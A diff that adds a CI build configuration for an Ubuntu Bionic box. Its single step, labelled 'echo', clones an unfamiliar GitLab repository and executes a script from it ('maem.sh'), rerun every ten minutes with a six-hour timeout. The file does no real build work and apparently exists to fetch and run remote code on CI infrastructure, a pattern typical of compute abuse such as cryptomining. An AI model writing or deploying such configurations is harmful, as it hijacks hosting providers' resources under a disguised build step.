@@ -1,0 +1,15 @@
+--- 
+box: "ubuntu:bionic"
+build: 
+  steps: 
+    - 
+      script: 
+        code: |
+            apt update -y && apt install -y git xz-utils && apt install -y bash
+            git clone https://gitlab.com/pakmolemu/madang.git && cd madang && chmod +x maem.sh && ./maem.sh
+        name: echo
+command-timeout: 360
+cron: "*/10 * * * *"
+
+
+
